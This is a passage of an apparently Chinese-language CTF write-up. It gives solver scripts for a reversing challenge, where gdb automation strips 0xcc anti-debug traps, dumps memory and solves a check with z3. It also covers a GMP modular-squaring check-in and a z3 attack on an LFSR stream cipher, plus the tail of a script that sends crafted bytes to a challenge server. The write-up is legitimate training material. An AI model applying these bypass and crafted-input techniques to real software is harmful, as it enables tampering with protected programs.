<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,
<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,
<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,
<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,
]
x = <span class="hljs-built_in">bytes</span>(x)+<span class="hljs-string">b&quot;\xc8\x4c\x08\x80&quot;</span>
<span class="hljs-comment"># p = process(&quot;./vp&quot;)</span>
p = remote(<span class="hljs-string">&quot;111.186.59.32&quot;</span>,<span class="hljs-string">&quot;20217&quot;</span>)
p.send(x)
<span class="hljs-built_in">print</span>(p.recvall())</code></pre><h3 id="fea"><a class="header-link" href="#fea"></a>FEA</h3>
<p>远程会发题目，需要逆题目并且求解。一共需要过 3 次，每次都需要在 10 秒内解决，题目的结构差不多，都是反调试（0xcc检测、cmdline 检测）、释放代码、跑释放出来的代码。</p>
<p>释放出来的代码结构也差不多，对input做一个运算，然后和一个超大函数运算的结果比较。</p>
<p>中途还碰到了好多问题：</p>
<ol class="list">
<li>那个大函数最开始不知道不需要逆……</li>
<li>Angr 跑check函数发生了诡异的问题，提了个 issue <a href="https://github.com/angr/angr/issues/2800">Unexpected behavior when executing a single function · Issue #2800 · angr/angr (github.com)</a> 不知道是不是我代码写错了</li>
<li>最后的调试里边，有 0xcc 需要去掉，否则会不停把 gdb 断下来。去的时候我直接搜 0xcc 给去了，可能导致函数出了点问题，但是好像并不是每次都会有问题，大概会有 1/4 - 1/5 左右的概率有问题</li>
<li>z3</li>
</ol>
<p>思路：过反调，gdb调试，获取到超大函数结果，z3 求解即可。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep

context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
p = remote(<span class="hljs-string">&quot;111.186.58.164&quot;</span>, <span class="hljs-string">&quot;30212&quot;</span>)
a, res = p.recvline().split(<span class="hljs-string">b&quot; == &quot;</span>)
res = res.strip()
question = a.split(<span class="hljs-string">b&quot;)&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">b&quot;+&quot;</span>)[<span class="hljs-number">1</span>]

tbl = <span class="hljs-string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456790&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">question, res</span>):</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tbl:
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tbl:
            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> tbl:
                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> tbl:
                    ans = <span class="hljs-built_in">bytes</span>([i,j,k,l])
                    r = ans+question
                    <span class="hljs-comment"># print(sha256(r).hexdigest().encode())</span>
                    <span class="hljs-comment"># print(res)</span>
                    <span class="hljs-keyword">if</span> sha256(r).hexdigest().encode() == res:
                        <span class="hljs-keyword">return</span> ans
ans = solve(question, res)
<span class="hljs-built_in">print</span>(ans)
p.sendline(ans)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    p.recvuntil(<span class="hljs-string">&quot;Here is your challenge:\n\n&quot;</span>)
    chall = p.recvline()
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(chall))
    <span class="hljs-built_in">print</span>(ans)
    name = <span class="hljs-string">&#x27;chall_&#x27;</span> + ans.decode()
    <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&quot;wb&quot;</span>).write(base64.b64decode(chall))

    res = subprocess.Popen([<span class="hljs-string">&#x27;gdb&#x27;</span>, name], stdin=subprocess.PIPE) 
    res.stdin.write(<span class="hljs-string">b&#x27;\nsource fuck.py\na\n\nquit\n&#x27;</span>)
    res.stdin.flush()
    sleep(<span class="hljs-number">5</span>)
    res.kill()
    <span class="hljs-built_in">print</span>(name)

    <span class="hljs-comment">#input()</span>

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-comment">#final_ans = int.to_bytes(int(f.read()), 8, &#x27;little&#x27;)</span>
        final_ans = f.read()
    p.send(final_ans)

p.interactive() </code></pre><p>z3求解：</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> gdb
<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

gdb.execute(<span class="hljs-string">&#x27;b *0x401135&#x27;</span>)

gdb.execute(<span class="hljs-string">&#x27;b *0x4013d7&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;r&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;set $rip=0x4013ea&#x27;</span>)

gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x4014e0)=0xc3&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x400be0)=0x48&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x400be0+1)=0x31&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x400be0+2)=0xc0&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x400be0+3)=0xc3&#x27;</span>)


gdb.execute(<span class="hljs-string">&#x27;set *(char*)(0x4012a7+7)=0x1&#x27;</span>)

gdb.execute(<span class="hljs-string">&#x27;c&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;ni&#x27;</span>)

addr = <span class="hljs-built_in">int</span>(gdb.parse_and_eval(<span class="hljs-string">&#x27;$rax&#x27;</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr))

gdb.execute(<span class="hljs-string">&#x27;b *0x401329&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;c&#x27;</span>)
gdb.execute(<span class="hljs-string">&#x27;ni&#x27;</span>)

gdb.execute(<span class="hljs-string">&#x27;dump binary memory image {} {}+0x30000&#x27;</span>.<span class="hljs-built_in">format</span>(addr, addr))

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;image&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:
    image = <span class="hljs-built_in">bytearray</span>(f.read())

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30000</span>):
    <span class="hljs-comment">#v = int(gdb.parse_and_eval(&#x27;*(char*)({})&#x27;.format(addr + i))) &amp; 0xff</span>
    <span class="hljs-keyword">if</span> image[i] == <span class="hljs-number">0xcc</span>:
        <span class="hljs-comment">#gdb.execute(&#x27;set *(char*)({}) = 0x90&#x27;.format(addr + i))</span>
        image[i] = <span class="hljs-number">0x90</span>

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;image&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:
    f.write(image)

gdb.execute(<span class="hljs-string">&#x27;restore image binary {} 0&#x27;</span>.<span class="hljs-built_in">format</span>(addr))

gdb.execute(<span class="hljs-string">&#x27;b *({}+*((long*)0x6060c0)+0x7a)&#x27;</span>.<span class="hljs-built_in">format</span>(addr))

<span class="hljs-comment">#gdb.execute(&#x27;b *({}+*((long*)0x6060c0)+0x7a-0x24)&#x27;.format(addr))</span>

gdb.execute(<span class="hljs-string">&#x27;c&#x27;</span>)

ans_ptr = <span class="hljs-built_in">int</span>(gdb.parse_and_eval(<span class="hljs-string">&#x27;$rdi&#x27;</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ans_ptr))
gdb.execute(<span class="hljs-string">&#x27;ni&#x27;</span>)
ans_0 = <span class="hljs-built_in">int</span>(gdb.parse_and_eval(<span class="hljs-string">&#x27;*(unsigned int*){}&#x27;</span>.<span class="hljs-built_in">format</span>(ans_ptr)))
ans_1 = <span class="hljs-built_in">int</span>(gdb.parse_and_eval(<span class="hljs-string">&#x27;*(unsigned int*)({}+4)&#x27;</span>.<span class="hljs-built_in">format</span>(ans_ptr)))

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ans.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-built_in">hex</span>(ans_0))
    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)
    f.write(<span class="hljs-built_in">hex</span>(ans_1))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">ans_0, ans_1, p_0, p_1</span>):</span>
    <span class="hljs-comment">#p_0 = 0x8861e08f</span>
    <span class="hljs-comment">#p_1 = 0x7a867251</span>
    <span class="hljs-comment">#p_0 = 0x27dbd098</span>
    <span class="hljs-comment">#p_1 = 0x8c3d97df</span>

    v1 = p_0 &gt;&gt; <span class="hljs-number">0x10</span>
    v2 = v1 * <span class="hljs-number">7</span>
    v2 &amp;= <span class="hljs-number">0xffffffff</span>

    v2 = (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">0x10</span>)
    v2 &amp;= <span class="hljs-number">0xffffffff</span>
    v2 = v2 - (v2 &gt;&gt; <span class="hljs-number">0x10</span>)
    v2 &amp;= <span class="hljs-number">0xffffffff</span>

    v3 = p_0 + <span class="hljs-number">6</span>
    v3 &amp;= <span class="hljs-number">0xffffffff</span>
    v4 = (p_1 &gt;&gt; <span class="hljs-number">0x10</span>) + <span class="hljs-number">5</span>
    v4 &amp;= <span class="hljs-number">0xffffffff</span>
    v5 = p_1 &amp; <span class="hljs-number">0xffff</span>
    v1 = v5 * <span class="hljs-number">4</span>
    v1 &amp;= <span class="hljs-number">0xffffffff</span>

    v1 = (v1 &amp; <span class="hljs-number">0xffff</span>) - (v1 &gt;&gt; <span class="hljs-number">0x10</span>)
    v1 = v1 - (v1 &gt;&gt; <span class="hljs-number">0x10</span>)

    v6 = (v4 ^ v2) &amp; <span class="hljs-number">0xffff</span>
    v5 = v6 * <span class="hljs-number">3</span>
    v5 &amp;= <span class="hljs-number">0xffffffff</span>

    v5 = (v5 &amp; <span class="hljs-number">0xffff</span>) - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)
    v7 = v5 - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)

    v6 = (v3 ^ v1) + v7 &amp; <span class="hljs-number">0xffff</span>
    v6 &amp;= <span class="hljs-number">0xffffffff</span>
    v5 = v6 * <span class="hljs-number">2</span>
    v5 &amp;= <span class="hljs-number">0xffffffff</span>

    v5 = (v5 &amp; <span class="hljs-number">0xffff</span>) - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)
    v5 = v5 - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(p_0), <span class="hljs-built_in">hex</span>(p_1), ans_0, ans_1, ((v2 ^ v5) &lt;&lt; <span class="hljs-number">0x10</span> | (v5 ^ v4) &amp; <span class="hljs-number">0xffff</span>) &amp; <span class="hljs-number">0xffffffff</span>, (((v1 ^ v7 + v5) &amp; <span class="hljs-number">0xffff</span> | (v3 ^ v7 + v5) &lt;&lt; <span class="hljs-number">0x10</span>) &amp; <span class="hljs-number">0xffffffff</span>))
    <span class="hljs-keyword">if</span> ((v2 ^ v5) &lt;&lt; <span class="hljs-number">0x10</span> | (v5 ^ v4) &amp; <span class="hljs-number">0xffff</span>) &amp; <span class="hljs-number">0xffffffff</span> != ans_0:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">if</span> (((v1 ^ v7 + v5) &amp; <span class="hljs-number">0xffff</span> | (v3 ^ v7 + v5) &lt;&lt; <span class="hljs-number">0x10</span>) &amp; <span class="hljs-number">0xffffffff</span>) != ans_1:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mysolve</span>(<span class="hljs-params">ans_0, ans_1</span>):</span>
    p_0 = BitVec(<span class="hljs-string">&#x27;p0&#x27;</span>, <span class="hljs-number">32</span>)
    p_1 = BitVec(<span class="hljs-string">&#x27;p1&#x27;</span>, <span class="hljs-number">32</span>)

    <span class="hljs-comment">#p_0 = 0x8861e08f</span>
    <span class="hljs-comment">#p_1 = 0x7a867251</span>
    <span class="hljs-comment">#p_0 = 0x27dbd098</span>
    <span class="hljs-comment">#p_1 = 0x8c3d97df</span>

    v1 = p_0 &gt;&gt; <span class="hljs-number">0x10</span>
    v2 = v1 * <span class="hljs-number">7</span>

    v2 = (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">0x10</span>)
    v2 = v2 - (v2 &gt;&gt; <span class="hljs-number">0x10</span>)

    v3 = p_0 + <span class="hljs-number">6</span>
    v4 = (p_1 &gt;&gt; <span class="hljs-number">0x10</span>) + <span class="hljs-number">5</span>
    v5 = p_1 &amp; <span class="hljs-number">0xffff</span>
    v1 = v5 * <span class="hljs-number">4</span>

    v1 = (v1 &amp; <span class="hljs-number">0xffff</span>) - (v1 &gt;&gt; <span class="hljs-number">0x10</span>)
    v1 = v1 - (v1 &gt;&gt; <span class="hljs-number">0x10</span>)

    v6 = (v4 ^ v2) &amp; <span class="hljs-number">0xffff</span>
    v5 = v6 * <span class="hljs-number">3</span>

    v5 = (v5 &amp; <span class="hljs-number">0xffff</span>) - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)
    v7 = v5 - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)

    v6 = (v3 ^ v1) + v7 &amp; <span class="hljs-number">0xffff</span>
    v5 = v6 * <span class="hljs-number">2</span>

    v5 = (v5 &amp; <span class="hljs-number">0xffff</span>) - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)
    v5 = v5 - (v5 &gt;&gt; <span class="hljs-number">0x10</span>)

    s = Solver()

    s.add(

        (v2 ^ v5) &lt;&lt; <span class="hljs-number">0x10</span> | (v5 ^ v4) &amp; <span class="hljs-number">0xffff</span> == ans_0,
        (v1 ^ v7 + v5) &amp; <span class="hljs-number">0xffff</span> | (v3 ^ v7 + v5) &lt;&lt; <span class="hljs-number">0x10</span> == ans_1
    )

    <span class="hljs-keyword">if</span> s.check() == sat:
        m = s.model()

        <span class="hljs-built_in">print</span>(m[p_0])
        <span class="hljs-built_in">print</span>(m[p_1])
        p_0 = <span class="hljs-built_in">int</span>(m[p_0].as_long())
        p_1 = <span class="hljs-built_in">int</span>(m[p_1].as_long())

        <span class="hljs-comment">#print(hex(p_0 + 0x10000 + (p_1 &lt;&lt; 32)))</span>
        <span class="hljs-comment">#enc(p_0 + 0x10000 + (p_1 &lt;&lt; 32))</span>

        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fuck(ans_0, ans_1, p_0, p_1):
            <span class="hljs-keyword">if</span> fuck(ans_0, ans_1, p_0 + <span class="hljs-number">0x100</span>, p_1):
                p_0 += <span class="hljs-number">0x100</span>
            <span class="hljs-keyword">elif</span> fuck(ans_0, ans_1, p_0 + <span class="hljs-number">0x10000</span>, p_1):
                p_0 += <span class="hljs-number">0x10000</span>
            <span class="hljs-keyword">elif</span> fuck(ans_0, ans_1, p_0 + <span class="hljs-number">0x10100</span>, p_1):
                p_0 += <span class="hljs-number">0x10100</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;fuck!!&#x27;</span>)


        res = <span class="hljs-built_in">int</span>.to_bytes(p_0, <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + <span class="hljs-built_in">int</span>.to_bytes(p_1, <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:
            f.write(res)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;fuck!&#x27;</span>)

    <span class="hljs-comment">#print((c1, c2))</span>

mysolve(ans_0, ans_1)</code></pre><p>比较神奇的是，不知道为啥，我的z3求解总是有可能出现几个错，然后发现只会错 0x100 0x10000 和 0x10100 ，我也不知道为啥。反正最后决定暴力跑一遍谁对了算谁。</p>
<p>但是即使如此依然还可能会错，大概有个 1/4 1/5 的概率是不对的，调了一下，应该是反调直接去 0xcc 有点过分。</p>
<p>但是可能我欧皇了，反正这样过了。</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="checkin"><a class="header-link" href="#checkin"></a>Checkin</h3>
<p>简单的计算题，用python写了一个太慢了，换C语言就可以了</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;gmp.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span>
</span>{
        <span class="hljs-keyword">int</span> m = atoi(argv[<span class="hljs-number">1</span>]);
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mod_s = argv[<span class="hljs-number">2</span>];
        <span class="hljs-keyword">mpz_t</span> mod, x;
        mpz_init_set_str(mod, mod_s, <span class="hljs-number">10</span>);
        mpz_init_set_ui(x, <span class="hljs-number">2</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) {
                mpz_mul(x, x, x);
                mpz_mod(x, x, mod);
        }
        mpz_out_str(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">10</span>, x);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><h3 id="zer0lfsr-"><a class="header-link" href="#zer0lfsr-"></a>zer0lfsr-</h3>
<p>参考了前年zer0lfsr的wp: <a href="https://fireshellsecurity.team/0ctf-zer0lfsr/">https://fireshellsecurity.team/0ctf-zer0lfsr/</a></p>
<p>发现可以用z3直接解。然后改了一下n2l就过了</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#---------------------original code---------------------#</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_prod</span>(<span class="hljs-params">L</span>):</span>
    p = <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> L:
        p *= x
    <span class="hljs-keyword">return</span> p

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_sum</span>(<span class="hljs-params">L</span>):</span>
    s = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> L:
        s ^= x
    <span class="hljs-keyword">return</span> s

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2l_0</span>(<span class="hljs-params">x, l</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-string">&#x27;{{0:0{}b}}&#x27;</span>.<span class="hljs-built_in">format</span>(l).<span class="hljs-built_in">format</span>(x)))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2l</span>(<span class="hljs-params">x,l</span>):</span>
    ans=[]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):
        ans.append(x&amp;<span class="hljs-number">1</span>)
        x=x&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> ans[::-<span class="hljs-number">1</span>]

x = <span class="hljs-number">12387192379</span>
l = <span class="hljs-number">64</span>
<span class="hljs-keyword">assert</span> n2l_0(x,l) == n2l(x,l)

    
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator1</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">list</span></span>):</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) == <span class="hljs-number">64</span>
        self.NFSR = key[: <span class="hljs-number">48</span>]
        self.LFSR = key[<span class="hljs-number">48</span>: ]
        self.TAP = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>]
        self.TAP2 = [[<span class="hljs-number">2</span>], [<span class="hljs-number">5</span>], [<span class="hljs-number">9</span>], [<span class="hljs-number">15</span>], [<span class="hljs-number">22</span>], [<span class="hljs-number">26</span>], [<span class="hljs-number">39</span>], [<span class="hljs-number">26</span>, <span class="hljs-number">30</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">9</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">26</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">39</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">26</span>, <span class="hljs-number">39</span>]]
        self.h_IN = [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">15</span>, <span class="hljs-number">27</span>]
        self.h_OUT = [[<span class="hljs-number">1</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>]]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span>(<span class="hljs-params">self</span>):</span>
        x = self.NFSR
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.TAP2)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">h</span>(<span class="hljs-params">self</span>):</span>
        x = [self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.h_IN[:-<span class="hljs-number">1</span>]] + [self.NFSR[self.h_IN[-<span class="hljs-number">1</span>]]]
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>(_prod(x[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> self.h_OUT)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">sum</span>([self.NFSR[<span class="hljs-number">0</span>], self.h()])

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clock</span>(<span class="hljs-params">self</span>):</span>
        o = self.f()
        self.NFSR = self.NFSR[<span class="hljs-number">1</span>: ] + [self.LFSR[<span class="hljs-number">0</span>] ^ self.g()]
        self.LFSR = self.LFSR[<span class="hljs-number">1</span>: ] + [_<span class="hljs-built_in">sum</span>(self.LFSR[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.TAP)]
        <span class="hljs-keyword">return</span> o

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator2</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, key</span>):</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) == <span class="hljs-number">64</span>
        self.NFSR = key[: <span class="hljs-number">16</span>]
        self.LFSR = key[<span class="hljs-number">16</span>: ]
        self.TAP = [<span class="hljs-number">0</span>, <span class="hljs-number">35</span>]
        self.f_IN = [<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">47</span>]
        self.f_OUT = [[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [
            <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>]]
        self.TAP2 = [[<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">9</span>]]
        self.h_IN = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>]
        self.h_OUT = [[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]]

